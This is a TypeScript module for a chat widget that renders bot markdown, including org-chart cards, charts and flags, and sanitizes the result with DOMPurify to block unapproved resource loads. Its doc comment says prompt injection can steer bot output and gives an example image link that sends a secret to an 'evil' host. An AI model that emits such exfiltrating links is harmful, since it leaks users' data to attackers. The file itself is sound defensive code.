import DOMPurify from 'dompurify';
import { Marked, Renderer, type Tokens } from 'marked';
import { ChatWidgetOptions, ReportPerson } from './types';
import {
  escapeHtml,
  isAllowedResourceUrl,
  renderImageAndLink,
  safeUrl,
  updateChartCode,
} from './utils';

const REPORT_ARROW_SVG =
  '<svg class="chat-message-children-report-arrow" width="27" height="104" viewBox="0 0 27 104" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M26.3536 99.6464C26.5488 99.8417 26.5488 100.158 26.3536 100.354L23.1716 103.536C22.9763 103.731 22.6597 103.731 22.4645 103.536C22.2692 103.34 22.2692 103.024 22.4645 102.828L25.2929 100L22.4645 97.1716C22.2692 96.9763 22.2692 96.6597 22.4645 96.4645C22.6597 96.2692 22.9763 96.2692 23.1716 96.4645L26.3536 99.6464ZM1 0H1.5V96H1H0.5V0H1ZM5 100V99.5H26V100V100.5H5V100ZM1 96H1.5C1.5 97.933 3.067 99.5 5 99.5V100V100.5C2.51472 100.5 0.5 98.4853 0.5 96H1Z" fill="#783F8E"/></svg>';

const FLAG_BASE_URL =
  'https://public-assets-rp.s3.eu-central-1.amazonaws.com/flags/';

// Attributes that make the browser fetch a URL without user interaction
const RESOURCE_ATTRIBUTES = ['src', 'poster', 'href', 'xlink:href', 'background'];

/**
 * Create a markdown-to-HTML function for bot messages.
 *
 * Each call builds its own `Marked` instance, so renderer overrides never leak
 * between widget instances or into a host page that also uses `marked`.
 *
 * Bot text is untrusted (it can be steered by prompt injection), so the final
 * HTML is always passed through DOMPurify before it reaches `innerHTML`.
 * Resources from origins outside `options.allowedResourceOrigins` are removed,
 * so a response can't leak data through e.g. `![](https://evil/?q=secret)`.
 */
export function createMarkdownRenderer(
  options: ChatWidgetOptions
): (text: string) => string {
  const renderImage = (imageInfo: { contract: string }) =>
    renderImageAndLink(options, imageInfo);

  const renderReport = (code: string) => {
    const reportInfo: ReportPerson = JSON.parse(code);
    const managerContractId = reportInfo?.contractId || '';
    const managerName = escapeHtml(reportInfo?.name);
    const managerRole = escapeHtml(reportInfo?.role);
    const directReports: ReportPerson[] = Array.isArray(
      reportInfo?.directReports
    )
      ? reportInfo.directReports
      : [];

    const managerCard = `<div class="chat-message-report-card chat-message-report-card-manager" data-contract-id="${escapeHtml(
      managerContractId
    )}">
            <div class="chat-message-report-text">
              <div class="chat-message-report-name">${managerName}</div>
              <div class="chat-message-report-role">${managerRole}</div>
            </div>
            ${renderImage({ contract: managerContractId })}
          </div>`;

    const reportsCards = directReports
      .map((rep: ReportPerson) => {
        const repContractId = rep?.contractId || '';
        return `<div class="chat-message-report-card" data-contract-id="${escapeHtml(
          repContractId
        )}">
                ${REPORT_ARROW_SVG}
                <div class="chat-message-report-text">
                  <div class="chat-message-report-name">${escapeHtml(rep?.name)}</div>
                  <div class="chat-message-report-role">${escapeHtml(rep?.role)}</div>
                </div>
                ${renderImage({ contract: repContractId })}
              </div>`;
      })
      .join('');

    const childrenBlock = directReports.length
      ? `<div class="chat-message-report-children">${reportsCards}</div>`
      : '';

    return `<div class="chat-message-report-container">${managerCard}${childrenBlock}</div>`;
  };

  const renderChart = (code: string) => {
    const primaryThemeColor = options.theme?.primaryColor || '#6c5ce7';
    const updatedCode = updateChartCode(JSON.parse(code), primaryThemeColor);
    const chartId = `vega-chart-${Math.random().toString(36).substring(7)}`;
    const escapedSpec = JSON.stringify(updatedCode)
      .replace(/"/g, '&quot;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
    return `<div class="chat-message-chart-container">
          <div id="${chartId}" class="chat-message-chart" data-chart-spec="${escapedSpec}"></div>
          </div>`;
  };

  const renderFlag = (json: string) => {
    const { code, country } = JSON.parse(json);
    if (code === 'XX') {
      return 'N/A';
    }
    const safeCountry = escapeHtml(country);
    // The code becomes part of a URL path, so only allow ISO 3166 alpha-2
    if (typeof code !== 'string' || !/^[a-z]{2}$/i.test(code)) {
      return `<span>${safeCountry}</span>`;
    }
    return `<div class="chat-message-flag-container">
          <img src="${FLAG_BASE_URL}${code.toLowerCase()}.svg" alt="${safeCountry}" />
          <span>${safeCountry}</span>
          </div>`;
  };

  const marked = new Marked({ gfm: true, breaks: true });
  marked.use({
    renderer: {
      link({ href, title, tokens }) {
        const text = this.parser.parseInline(tokens);
        const url = safeUrl(href);
        if (!url) {
          return text;
        }
        return `<a href="${escapeHtml(url)}"${
          title ? ` title="${escapeHtml(title)}"` : ''
        } target="_blank" rel="noopener noreferrer">${text}</a>`;
      },

      code({ text, lang }) {
        // Organization report
        if (lang === 'report') {
          try {
            return renderReport(text);
          } catch {
            return 'Building report...';
          }
        }
        // Vega-Lite chart
        if (lang === 'chart') {
          try {
            return renderChart(text);
          } catch {
            return 'Building chart...';
          }
        }
        // Code block image
        if (lang === 'image') {
          try {
            const imageInfo = JSON.parse(text);
            return imageInfo?.contract === 'N/A' ? '' : renderImage(imageInfo);
          } catch {
            return 'Loading image...';
          }
        }
        return false;
      },

      codespan({ text }) {
        // Inline image
        if (text.startsWith('image')) {
          try {
            const imageInfo = JSON.parse(text.slice(5).trim());
            return imageInfo?.contract === 'N/A' ? '' : renderImage(imageInfo);
          } catch {
            return 'Loading image...';
          }
        }
        if (text.startsWith('flag')) {
          try {
            return renderFlag(text.slice(4).trim());
          } catch {
            return '';
          }
        }
        return false;
      },

      table(token: Tokens.Table) {
        const tableHtml = Renderer.prototype.table.call(this, token);
        return '<div style="overflow-x: auto;">' + tableHtml + '</div>';
      },
    },
  });

  const allowedOrigins = [
    ...(options.allowedResourceOrigins ?? []),
    new URL(FLAG_BASE_URL).origin,
  ];
  const isAllowed = (url: string) => isAllowedResourceUrl(url, allowedOrigins);

  // A private DOMPurify instance, so hooks don't affect the host page
  const purify = DOMPurify(window);
  purify.addHook('uponSanitizeAttribute', (node, data) => {
    const { attrName, attrValue } = data;
    const isLink = ['A', 'AREA'].includes(node.nodeName.toUpperCase());
    if (attrName === 'style') {
      // url(), image-set() etc. load resources; CSS escapes can hide them
      data.keepAttr = !/\\|url|image|src/i.test(attrValue);
    } else if (RESOURCE_ATTRIBUTES.includes(attrName) && !isLink) {
      data.keepAttr = isAllowed(attrValue);
    } else if (
      !/^(data|aria)-/.test(attrName) &&
      !['alt', 'title', 'href'].includes(attrName) &&
      /url\s*\(|\\/i.test(attrValue)
    ) {
      // SVG presentation attributes (fill, mask, clip-path, marker-*, ...)
      // accept url() references, which the browser fetches
      data.keepAttr = false;
    }
  });
  purify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A' && node.hasAttribute('href')) {
      if (safeUrl(node.getAttribute('href'))) {
        node.setAttribute('target', '_blank');
        node.setAttribute('rel', 'noopener noreferrer');
      } else {
        node.removeAttribute('href');
      }
    }
  });

  return (text: string) =>
    purify.sanitize(marked.parse(text, { async: false }) as string, {
      FORBID_TAGS: ['form', 'style'],
      // Browsers split srcset candidates differently from any simple parser
      FORBID_ATTR: ['srcset'],
    });
}
